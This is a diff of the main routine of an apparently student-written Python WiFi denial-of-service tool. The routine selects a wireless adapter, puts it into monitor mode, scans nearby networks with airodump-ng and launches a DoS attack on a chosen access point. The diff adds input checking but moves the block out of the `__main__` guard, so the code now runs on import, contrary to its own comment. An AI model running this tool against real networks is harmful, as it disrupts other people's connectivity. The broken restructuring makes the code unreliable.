@@ -183,22 +183,34 @@ if __name__ == "__main__":
     wireless_interfaces = discover_wireless_adapters()
 
     print("Available WiFi interfaces:")
-    for i, iface in enumerate(wireless_interfaces):
-        print(f"{i} - {iface}")
-    iface_choice = int(input("Pick interface to use for attack:"))
-    selected_interface = wireless_interfaces[iface_choice]
+for i, iface in enumerate(wireless_interfaces):
+    print(f"{i} - {iface}")
+
+while True:
+    try:
+        iface_choice = int(input("Pick interface to use for attack: "))
+        # Check if the input is within the valid range of interfaces
+        if 0 <= iface_choice < len(wireless_interfaces):
+            break
+        else:
+            print("Please enter a number corresponding to the interface listed.")
+    except ValueError:
+        print("Invalid input. Please enter a number.")
+        
+selected_interface = wireless_interfaces[iface_choice]
+
 # name = main --> We can import this script into another one without it running automatically in this one. 
 # We check if superuser is performing/move existing .csv files to temp directory/find interfaces/adapters that can be put in monitor mode
 # for i, iface --> this loop interates available interfaces, printing each with an index number such as 0-wlan0, 1-wlan1 
 # User selects iterface of interest and program stores it
 
-    terminate_conflicting_processes()
-    enable_monitor_mode(selected_interface)
-    scan_networks(selected_interface)
+terminate_conflicting_processes()
+enable_monitor_mode(selected_interface)
+scan_networks(selected_interface)
 # This prepares for the attack by eliminating processes that conflict with monitor mode such as network manager, places wireless interface into monitor mode, scans close networks using "airodump-ng" displaying such headers 
 
-    target_network = set_target_network()
-    perform_dos_attack(selected_interface, target_network["BSSID"], target_network["channel"].strip())
+target_network = set_target_network()
+perform_dos_attack(selected_interface, target_network["BSSID"], target_network["channel"].strip())
 # DoS attack is initated 
 
 
